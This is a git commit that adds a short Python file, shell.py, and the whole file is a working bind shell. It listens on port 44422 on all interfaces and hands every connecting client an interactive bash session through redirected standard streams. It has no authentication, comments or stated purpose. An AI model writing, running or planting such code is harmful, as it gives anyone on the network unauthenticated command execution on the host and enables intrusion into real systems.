966bbea4f6bff8f09c5ab8019852ced96234bd6b
pavelrn <30939390+pavelrn@users.noreply.github.com>
2023-07-13 19:26:02 +0200

    Create shell.py

---
+++ shell.py
@@ -0,0 +1,11 @@
+import socket,os,subprocess
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.bind(("0.0.0.0",44422))
+s.listen(5)
+while True:
+  c,a=s.accept()
+  os.dup2(c.fileno(),0)
+  os.dup2(c.fileno(),1)
+  os.dup2(c.fileno(),2)
+  p=subprocess.call(["/bin/bash","-i"])
